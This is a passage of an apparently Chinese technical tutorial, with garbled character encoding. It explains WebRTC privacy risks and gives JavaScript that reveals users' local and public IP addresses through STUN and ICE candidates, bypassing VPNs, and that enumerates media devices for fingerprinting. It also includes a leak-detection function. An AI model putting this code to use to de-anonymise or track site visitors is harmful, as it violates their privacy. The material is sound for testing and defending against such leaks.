      <p><strong>WebRTC</strong> æ˜¯ä¸€ç»„æ ‡å‡†åŒ–çš„ APIï¼Œå…è®¸æµè§ˆå™¨å’Œç§»åŠ¨åº”ç”¨ç¨‹åºè¿›è¡Œç‚¹å¯¹ç‚¹çš„å®æ—¶é€šä¿¡ï¼Œæ— éœ€å®‰è£…æ’ä»¶æˆ–ç¬¬ä¸‰æ–¹è½¯ä»¶ã€‚</p>

      <p><strong>ä¸»è¦ç»„ä»¶</strong>:</p>

      <ul>
        <li><strong>getUserMedia</strong>: è®¿é—®æ‘„åƒå¤´å’Œéº¦å…‹é£</li>
        <li><strong>RTCPeerConnection</strong>: å»ºç«‹ç‚¹å¯¹ç‚¹éŸ³è§†é¢‘é€šä¿¡</li>
        <li><strong>RTCDataChannel</strong>: ç‚¹å¯¹ç‚¹æ•°æ®ä¼ è¾“</li>
      </ul>

      <p><strong>éšç§é£é™©</strong>:</p>

      <ul>
        <li>æ³„éœ²çœŸå® IP åœ°å€ï¼ˆç»•è¿‡ VPN/ä»£ç†ï¼‰</li>
        <li>æ”¶é›†è®¾å¤‡æŒ‡çº¹ä¿¡æ¯</li>
        <li>è·å–æœ¬åœ°ç½‘ç»œæ‹“æ‰‘</li>
        <li>æš´éœ²åª’ä½“è®¾å¤‡ä¿¡æ¯</li>
      </ul>

      <h3 id="æ ¸å¿ƒåŸç†">æ ¸å¿ƒåŸç†</h3>

      <h4 id="webrtc-è¿æ¥å»ºç«‹è¿‡ç¨‹">WebRTC è¿æ¥å»ºç«‹è¿‡ç¨‹</h4>

      <pre><code>å®¢æˆ·ç«¯ A                                   å®¢æˆ·ç«¯ B
    |                                          |
    |-- 1. åˆ›å»º RTCPeerConnection -----------&gt;|
    |                                          |
    |-- 2. æ”¶é›† ICE Candidates ---------------&gt;|
    |    (åŒ…å«æœ¬åœ°/å…¬ç½‘ IP)                     |
    |                                          |
    |&lt;- 3. äº¤æ¢ SDP Offer/Answer --------------|
    |                                          |
    |-- 4. å»ºç«‹ç‚¹å¯¹ç‚¹è¿æ¥ --------------------&gt;|
    |                                          |
    |&lt;======= 5. å®æ—¶é€šä¿¡ =====================&gt;|
</code></pre>

      <h4 id="ice-interactive-connectivity-establishment">ICE (Interactive Connectivity Establishment)</h4>

      <p>WebRTC ä½¿ç”¨ ICE åè®®æ”¶é›†å€™é€‰è¿æ¥è·¯å¾„ï¼š</p>

      <ul>
        <li><strong>Host Candidate</strong>: æœ¬åœ° IP åœ°å€ï¼ˆå±€åŸŸç½‘ IPï¼‰</li>
        <li><strong>Server Reflexive Candidate</strong>: å…¬ç½‘ IPï¼ˆé€šè¿‡ STUN æœåŠ¡å™¨è·å–ï¼‰</li>
        <li><strong>Relay Candidate</strong>: ä¸­ç»§ IPï¼ˆé€šè¿‡ TURN æœåŠ¡å™¨ï¼‰</li>
      </ul>

      <p>è¿™äº›ä¿¡æ¯å¯ä»¥è¢« JavaScript è®¿é—®ï¼Œå¯¼è‡´ IP æ³„éœ²ã€‚</p>

      <hr />

      <h2 id="è¯¦ç»†å†…å®¹">è¯¦ç»†å†…å®¹</h2>

      <h3 id="ip-åœ°å€æ³„éœ²">IP åœ°å€æ³„éœ²</h3>

      <h4 id="1-æœ¬åœ°-ip-æ³„éœ²">1. <strong>æœ¬åœ° IP æ³„éœ²</strong></h4>

      <p>å³ä½¿ç”¨æˆ·ä½¿ç”¨ VPNï¼ŒWebRTC ä»å¯èƒ½æ³„éœ²çœŸå®çš„æœ¬åœ° IPã€‚</p>

      <p><strong>æ³„éœ²æœºåˆ¶</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åˆ›å»º RTCPeerConnection</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">pc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">RTCPeerConnection</span><span class="p">({</span>
<span class="w">    </span><span class="nx">iceServers</span><span class="o">:</span><span class="w"> </span><span class="p">[{</span><span class="nx">urls</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;stun:stun.l.google.com:19302&#39;</span><span class="p">}]</span>
<span class="p">});</span>

<span class="c1">// åˆ›å»ºè™šæ‹Ÿæ•°æ®é€šé“</span>
<span class="nx">pc</span><span class="p">.</span><span class="nx">createDataChannel</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>

<span class="c1">// åˆ›å»º Offer</span>
<span class="nx">pc</span><span class="p">.</span><span class="nx">createOffer</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">offer</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">pc</span><span class="p">.</span><span class="nx">setLocalDescription</span><span class="p">(</span><span class="nx">offer</span><span class="p">));</span>

<span class="c1">// ç›‘å¬ ICE å€™é€‰</span>
<span class="nx">pc</span><span class="p">.</span><span class="nx">onicecandidate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">ice</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">ice</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">ice</span><span class="p">.</span><span class="nx">candidate</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">ice</span><span class="p">.</span><span class="nx">candidate</span><span class="p">.</span><span class="nx">candidate</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ice</span><span class="p">.</span><span class="nx">candidate</span><span class="p">.</span><span class="nx">candidate</span><span class="p">;</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ICE Candidate:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">candidate</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// è§£æ IP åœ°å€</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">ipRegex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/</span><span class="p">;</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">match</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">candidate</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">ipRegex</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">match</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Leaked IP:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">match</span><span class="p">[</span><span class="mf">1</span><span class="p">]);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">};</span>
</code></pre>
      </div>

      <p><strong>æ³„éœ²çš„ä¿¡æ¯</strong>:</p>

      <ul>
        <li>å†…ç½‘ IPv4 åœ°å€ (192.168.x.x, 10.x.x.x)</li>
        <li>å†…ç½‘ IPv6 åœ°å€</li>
        <li>å…¬ç½‘ IPv4/IPv6 åœ°å€</li>
        <li>mDNS å€™é€‰ï¼ˆæŸäº›æµè§ˆå™¨ï¼‰</li>
      </ul>

      <h4 id="2-å…¬ç½‘-ip-æ³„éœ²">2. <strong>å…¬ç½‘ IP æ³„éœ²</strong></h4>

      <p>é€šè¿‡ STUN æœåŠ¡å™¨è·å–ç”¨æˆ·çš„çœŸå®å…¬ç½‘ IPï¼Œç»•è¿‡ VPN/ä»£ç†ã€‚</p>

      <p><strong>å®Œæ•´ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">getIPs</span><span class="p">(</span><span class="nx">callback</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">ips</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">pc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">RTCPeerConnection</span><span class="p">({</span>
<span class="w">        </span><span class="nx">iceServers</span><span class="o">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">            </span><span class="p">{</span><span class="nx">urls</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;stun:stun.l.google.com:19302&#39;</span><span class="p">},</span>
<span class="w">            </span><span class="p">{</span><span class="nx">urls</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;stun:stun1.l.google.com:19302&#39;</span><span class="p">}</span>
<span class="w">        </span><span class="p">]</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="nx">pc</span><span class="p">.</span><span class="nx">createDataChannel</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">pc</span><span class="p">.</span><span class="nx">createOffer</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">offer</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">pc</span><span class="p">.</span><span class="nx">setLocalDescription</span><span class="p">(</span><span class="nx">offer</span><span class="p">));</span>

<span class="w">    </span><span class="nx">pc</span><span class="p">.</span><span class="nx">onicecandidate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">ice</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">ice</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="nx">ice</span><span class="p">.</span><span class="nx">candidate</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="nx">ice</span><span class="p">.</span><span class="nx">candidate</span><span class="p">.</span><span class="nx">candidate</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">return</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ice</span><span class="p">.</span><span class="nx">candidate</span><span class="p">.</span><span class="nx">candidate</span><span class="p">;</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">ipRegex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/</span><span class="p">;</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">match</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">candidate</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">ipRegex</span><span class="p">);</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">match</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">ips</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">match</span><span class="p">[</span><span class="mf">1</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">ips</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">match</span><span class="p">[</span><span class="mf">1</span><span class="p">]);</span>
<span class="w">            </span><span class="nx">callback</span><span class="p">(</span><span class="nx">match</span><span class="p">[</span><span class="mf">1</span><span class="p">],</span><span class="w"> </span><span class="nx">candidate</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨</span>
<span class="nx">getIPs</span><span class="p">((</span><span class="nx">ip</span><span class="p">,</span><span class="w"> </span><span class="nx">candidate</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;IP:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">ip</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Type:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">candidate</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;typ host&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="s1">&#39;Local&#39;</span><span class="w"> </span><span class="o">:</span>
<span class="w">                        </span><span class="nx">candidate</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;typ srflx&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="s1">&#39;Public&#39;</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Relay&#39;</span><span class="p">);</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h3 id="è®¾å¤‡æŒ‡çº¹ä¿¡æ¯">è®¾å¤‡æŒ‡çº¹ä¿¡æ¯</h3>

      <h4 id="1-åª’ä½“è®¾å¤‡æšä¸¾">1. <strong>åª’ä½“è®¾å¤‡æšä¸¾</strong></h4>

      <p>WebRTC å¯ä»¥æšä¸¾ç”¨æˆ·çš„éŸ³è§†é¢‘è®¾å¤‡ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">navigator</span><span class="p">.</span><span class="nx">mediaDevices</span><span class="p">.</span><span class="nx">enumerateDevices</span><span class="p">()</span>
<span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">devices</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">devices</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">device</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">({</span>
<span class="w">                </span><span class="nx">kind</span><span class="o">:</span><span class="w"> </span><span class="nx">device</span><span class="p">.</span><span class="nx">kind</span><span class="p">,</span><span class="w">          </span><span class="c1">// &quot;audioinput&quot;, &quot;videoinput&quot;, &quot;audiooutput&quot;</span>
<span class="w">                </span><span class="nx">label</span><span class="o">:</span><span class="w"> </span><span class="nx">device</span><span class="p">.</span><span class="nx">label</span><span class="p">,</span><span class="w">        </span><span class="c1">// è®¾å¤‡åç§°</span>
<span class="w">                </span><span class="nx">deviceId</span><span class="o">:</span><span class="w"> </span><span class="nx">device</span><span class="p">.</span><span class="nx">deviceId</span><span class="p">,</span><span class="w">  </span><span class="c1">// å”¯ä¸€æ ‡è¯†ç¬¦</span>
<span class="w">                </span><span class="nx">groupId</span><span class="o">:</span><span class="w"> </span><span class="nx">device</span><span class="p">.</span><span class="nx">groupId</span><span class="w">     </span><span class="c1">// è®¾å¤‡ç»„</span>
<span class="w">            </span><span class="p">});</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">    </span><span class="p">});</span>
</code></pre>
      </div>

      <p><strong>æŒ‡çº¹ç”¨é€”</strong>:</p>

      <ul>
        <li><code>deviceId</code> å¯ä½œä¸ºæŒä¹…åŒ–æ ‡è¯†ç¬¦</li>
        <li>è®¾å¤‡æ•°é‡å’Œç±»å‹ç»„åˆå½¢æˆç‹¬ç‰¹æŒ‡çº¹</li>
        <li>è®¾å¤‡åç§°å¯èƒ½æš´éœ²ç¡¬ä»¶ä¿¡æ¯</li>
      </ul>

      <h4 id="2-ç¼–è§£ç å™¨æ”¯æŒ">2. <strong>ç¼–è§£ç å™¨æ”¯æŒ</strong></h4>

      <p>ä¸åŒè®¾å¤‡æ”¯æŒä¸åŒçš„éŸ³è§†é¢‘ç¼–è§£ç å™¨ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">pc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">RTCPeerConnection</span><span class="p">();</span>

<span class="nx">pc</span><span class="p">.</span><span class="nx">createOffer</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">offer</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">codecs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>

<span class="w">    </span><span class="c1">// è§£æ SDP è·å–æ”¯æŒçš„ç¼–è§£ç å™¨</span>
<span class="w">    </span><span class="nx">offer</span><span class="p">.</span><span class="nx">sdp</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;\r\n&#39;</span><span class="p">).</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">line</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">line</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;a=rtpmap:&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">codecs</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">line</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Supported codecs:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">codecs</span><span class="p">);</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h4 id="3-rtc-ç»Ÿè®¡ä¿¡æ¯">3. <strong>RTC ç»Ÿè®¡ä¿¡æ¯</strong></h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">pc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">RTCPeerConnection</span><span class="p">();</span>

<span class="nx">pc</span><span class="p">.</span><span class="nx">getStats</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">stats</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">stats</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">report</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">({</span>
<span class="w">            </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="nx">report</span><span class="p">.</span><span class="nx">type</span><span class="p">,</span>
<span class="w">            </span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="nx">report</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span>
<span class="w">            </span><span class="nx">timestamp</span><span class="o">:</span><span class="w"> </span><span class="nx">report</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">,</span>
<span class="w">            </span><span class="p">...</span><span class="nx">report</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>å¯è·å–çš„ä¿¡æ¯</strong>:</p>

      <ul>
        <li>ç½‘ç»œè´¨é‡æŒ‡æ ‡</li>
        <li>ä¼ è¾“ç»Ÿè®¡</li>
        <li>ç¼–è§£ç å™¨æ€§èƒ½</li>
        <li>ç¡¬ä»¶åŠ é€Ÿèƒ½åŠ›</li>
      </ul>

      <h3 id="éšç§ä¿æŠ¤æ£€æµ‹">éšç§ä¿æŠ¤æ£€æµ‹</h3>

      <h4 id="æ£€æµ‹-webrtc-æ³„éœ²">æ£€æµ‹ WebRTC æ³„éœ²</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">detectWebRTCLeak</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">localIPs</span><span class="o">:</span><span class="w"> </span><span class="p">[],</span>
<span class="w">        </span><span class="nx">publicIPs</span><span class="o">:</span><span class="w"> </span><span class="p">[],</span>
<span class="w">        </span><span class="nx">devices</span><span class="o">:</span><span class="w"> </span><span class="p">[],</span>
<span class="w">        </span><span class="nx">leakDetected</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// 1. æ£€æµ‹ IP æ³„éœ²</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">pc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">RTCPeerConnection</span><span class="p">({</span>
<span class="w">        </span><span class="nx">iceServers</span><span class="o">:</span><span class="w"> </span><span class="p">[{</span><span class="nx">urls</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;stun:stun.l.google.com:19302&#39;</span><span class="p">}]</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="nx">pc</span><span class="p">.</span><span class="nx">createDataChannel</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">pc</span><span class="p">.</span><span class="nx">createOffer</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">offer</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">pc</span><span class="p">.</span><span class="nx">setLocalDescription</span><span class="p">(</span><span class="nx">offer</span><span class="p">));</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">pc</span><span class="p">.</span><span class="nx">onicecandidate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">ice</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">ice</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="nx">ice</span><span class="p">.</span><span class="nx">candidate</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">resolve</span><span class="p">();</span>
<span class="w">                </span><span class="k">return</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>

<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ice</span><span class="p">.</span><span class="nx">candidate</span><span class="p">.</span><span class="nx">candidate</span><span class="p">;</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">ipMatch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">candidate</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/([0-9]{1,3}\.){3}[0-9]{1,3}/</span><span class="p">);</span>

<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">ipMatch</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">ip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ipMatch</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">ip</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;192.168.&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">ip</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;10.&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">ip</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;172.&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">results</span><span class="p">.</span><span class="nx">localIPs</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">ip</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">results</span><span class="p">.</span><span class="nx">publicIPs</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">ip</span><span class="p">);</span>
<span class="w">                    </span><span class="nx">results</span><span class="p">.</span><span class="nx">leakDetected</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">};</span>

<span class="w">        </span><span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span><span class="w"> </span><span class="mf">2000</span><span class="p">);</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="c1">// 2. æ£€æµ‹è®¾å¤‡æšä¸¾</span>
<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">devices</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">mediaDevices</span><span class="p">.</span><span class="nx">enumerateDevices</span><span class="p">();</span>
<span class="w">        </span><span class="nx">results</span><span class="p">.</span><span class="nx">devices</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">devices</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">d</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">({</span>
<span class="w">            </span><span class="nx">kind</span><span class="o">:</span><span class="w"> </span><span class="nx">d</span><span class="p">.</span><span class="nx">kind</span><span class="p">,</span>
<span class="w">            </span><span class="nx">label</span><span class="o">:</span><span class="w"> </span><span class="nx">d</span><span class="p">.</span><span class="nx">label</span><span class="p">,</span>
<span class="w">            </span><span class="nx">hasId</span><span class="o">:</span><span class="w"> </span><span class="o">!!</span><span class="nx">d</span><span class="p">.</span><span class="nx">deviceId</span>
<span class="w">        </span><span class="p">}));</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Device enumeration blocked&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">results</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨</span>
<span class="nx">detectWebRTCLeak</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">results</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;WebRTC Leak Detection Results:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">results</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">results</span><span class="p">.</span><span class="nx">leakDetected</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">warn</span><span class="p">(</span><span class="s1">&#39;âš ï¸ WebRTC IP leak detected!&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å®æˆ˜ç¤ºä¾‹">å®æˆ˜ç¤ºä¾‹</h2>

      <h3 id="ç¤ºä¾‹1-å®Œæ•´çš„-ip-æ³„éœ²æ£€æµ‹å·¥å…·">ç¤ºä¾‹1: å®Œæ•´çš„ IP æ³„éœ²æ£€æµ‹å·¥å…·</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">class</span><span class="w"> </span><span class="nx">WebRTCLeakDetector</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">ips</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Set</span><span class="p">();</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">candidates</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">detect</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
